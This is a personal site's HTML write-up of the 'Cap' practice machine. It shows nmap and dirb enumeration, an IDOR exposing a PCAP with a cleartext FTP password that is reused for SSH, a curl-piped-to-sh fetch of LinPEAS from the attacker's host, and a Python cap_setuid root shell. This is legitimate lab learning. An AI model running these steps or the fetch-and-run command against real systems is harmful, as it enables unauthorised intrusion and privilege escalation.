@@ -1,0 +1,191 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cap Machine — Write-Up</title>
+    <link rel="stylesheet" href="writeups.css">
+    <link rel="stylesheet" href="../styles.css">
+    <script src="../script.js" defer></script>
+</head>
+
+<body>
+
+<div id="mobile-menu-button">
+    &#9776;
+</div>
+
+<div id="sidebar" class="sidebar">
+    <h2>~/home</h2>
+    <a href="../index.html">Home</a>
+    <a href="../about.html">About Me</a>
+    <a href="../projects.html">Projects</a>
+    <a href="../writeups.html" class="active">Write-Ups</a>
+    <a href="../contact.html">Contact</a>
+
+    <div class="social-icons">
+        <a href="https://www.linkedin.com/in/iustin-barbir" target="_blank">
+            <img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/linkedin.svg" alt="LinkedIn">
+        </a>
+        <a href="https://github.com/IustinBarbir" target="_blank">
+            <img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/github.svg" alt="GitHub">
+        </a>
+        <a href="https://tryhackme.com/p/Glitch21" target="_blank">
+            <img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/tryhackme.svg" alt="TryHackMe">
+        </a>
+    </div>
+</div>
+
+<section id="writeup-container">
+    <div class="writeup-content">
+        <h1>Cap Machine - Guided Mode</h1>
+
+        <p>Cap Machine - Guided Mode</p>
+
+        <p>Task 1</p>
+        <p>How many TCP ports are open?</p>
+        <p>I ran my usual scan for VMs:</p>
+
+        <pre><code>└─$ sudo nmap -sC -sV -A -T4 -p- 10.129.17.59</code></pre>
+
+        <p>3 ports: FTP, SSH & HTTP</p>
+
+        <p>Task 2:</p>
+
+        <p>After running a "Security Snapshot", the browser is redirected to a path of the format /[something]/[id], where [id] represents the id number of the scan. What is the [something]?</p>
+
+        <p>Before doing this, since port 80 is open, I ran the usual directory scanning:</p>
+
+        <pre><code>└─$ dirb http://10.129.17.59/ /usr/share/wordlists/dirb/small.txt</code></pre>
+
+        <p>This actually gave the answer to the task as well:</p>
+
+        <pre><code>+ http://10.129.17.59/data (CODE:302|SIZE:208)
++ http://10.129.17.59/netstat (CODE:200|SIZE:27269)</code></pre>
+
+        <p>which is the same as <code>http://10.129.17.59/data/1</code></p>
+
+        <p>Task 3:</p>
+        <p>Are you able to get to other users' scans?</p>
+
+        <p>Yes.</p>
+
+        <p>Since the format is <code>http://10.129.17.59/data/1</code>, assuming 1 is our id, we can try other numbers corresponding to other users.</p>
+
+        <p><code>http://10.129.17.59/data/2</code> does not lead to anything, but <code>http://10.129.17.59/data/0</code> does.</p>
+
+        <p>Task 4</p>
+        <p>What is the ID of the PCAP file that contains sensative data?</p>
+
+        <p><code>http://10.129.17.59/data/0</code></p>
+
+        <p>so the answear is 0</p>
+
+        <p>Task 5:</p>
+
+        <p>Which application layer protocol in the pcap file can the sensetive data be found in?</p>
+
+        <p>Analyzing the pcap file, we can see FTP. Following TCP stream gives us exactly what we need:</p>
+
+        <pre><code>220 (vsFTPd 3.0.3)
+USER nathan
+331 Please specify the password.
+PASS Buck3tH4TF0RM3!
+230 Login successful.</code></pre>
+
+        <p>FTP</p>
+
+        <p>Task 6:</p>
+
+        <p>We've managed to collect nathan's FTP password. On what other service does this password work?</p>
+
+        <p>Since SSH is the only other relevant port open, I am assuming SSH.</p>
+
+        <p>Correct</p>
+
+        <pre><code>nathan@cap:~$</code></pre>
+
+        <p>Task 7:</p>
+
+        <p>Submit the flag located in the nathan user's home directory.</p>
+
+        <pre><code>nathan@cap:~$ ls
+user.txt
+
+nathan@cap:~$ cat user.txt</code></pre>
+
+        <p>Task 8:</p>
+
+        <p>What is the full path to the binary on this machine has special capabilities that can be abused to obtain root privileges?</p>
+
+        <p>I tried to see what nathan can run with sudo, but to no success:</p>
+
+        <pre><code>nathan@cap:~$ sudo -l
+[sudo] password for nathan:
+Sorry, user nathan may not run sudo on cap.</code></pre>
+
+        <p>After looking at the hint, they suggested using LinPEAS.</p>
+
+        <p>This was the first time I actually used it, although I heared of it before, but never needed it for THM challenges.</p>
+
+        <p>Since nathan could not use the curl method, I used another option:</p>
+
+        <pre><code>──(glitch㉿Kali)-[~/Downloads]
+└─$ sudo python3 -m http.server 80</code></pre>
+
+        <pre><code>nathan@cap:~$ curl 10.10.15.194/linpeas.sh | sh</code></pre>
+
+        <p>As hinted, I looked for files with capabilities:</p>
+
+        <pre><code>Files with capabilities (limited to 50):
+/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
+/usr/bin/ping = cap_net_raw+ep
+/usr/bin/traceroute6.iputils = cap_net_raw+ep
+/usr/bin/mtr-packet = cap_net_raw+ep
+/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep</code></pre>
+
+        <p>The first thing that caught my eye was cap_setuid. I think I could change user id to 0, which would be root.</p>
+
+        <p>After I confirmed that it could be done (<a href="https://www.elastic.co/guide/en/security/8.19/potential-privilege-escalation-via-python-cap-setuid.html" target="_blank">Potential Privilege Escalation via Python cap_setuid</a>)</p>
+
+        <p>I tried using setuid in a python script from <a href="https://www.geeksforgeeks.org/python/python-os-getuid-and-os-setuid-method/" target="_blank">Python | os.getuid() and os.setuid() method</a>, but to no success</p>
+
+        <pre><code>nathan@cap:~$ python3 test.py
+Real user ID of the current process: 1001
+Real user ID changed
+Real user ID of the current process: 0</code></pre>
+
+        <pre><code>nathan@cap:~$ sudo -l
+Sorry, user nathan may not run sudo on cap.</code></pre>
+
+        <p>In the end, I wanted to confirm that I am on the right track, so I test if it was the correct path.</p>
+
+        <p>And it was: <code>/usr/bin/python3.8</code></p>
+
+        <p>However, it was much simpler. This article helped me:
+        <a href="https://medium.com/@forgecode/linux-privilege-escalation-via-cap-setuid-gaining-root-with-python-ecca7cab716e" target="_blank">Linux Privilege Escalation via cap_setuid gaining root with Python</a></p>
+
+        <p>The code simply looks like this:</p>
+
+        <pre><code>import os
+os.setuid(0)
+os.system('whoami')
+os.system('sh')</code></pre>
+
+        <pre><code>nathan@cap:~$ nano test.py
+nathan@cap:~$ python3 test.py
+root
+# whoami
+root</code></pre>
+
+        <p>Submit the flag located in root's home directory.</p>
+
+        <pre><code>/root/root.txt</code></pre>
+
+        <p>And got the flag</p>
+
+    </div>
+</section>
+
+</body>
+</html>
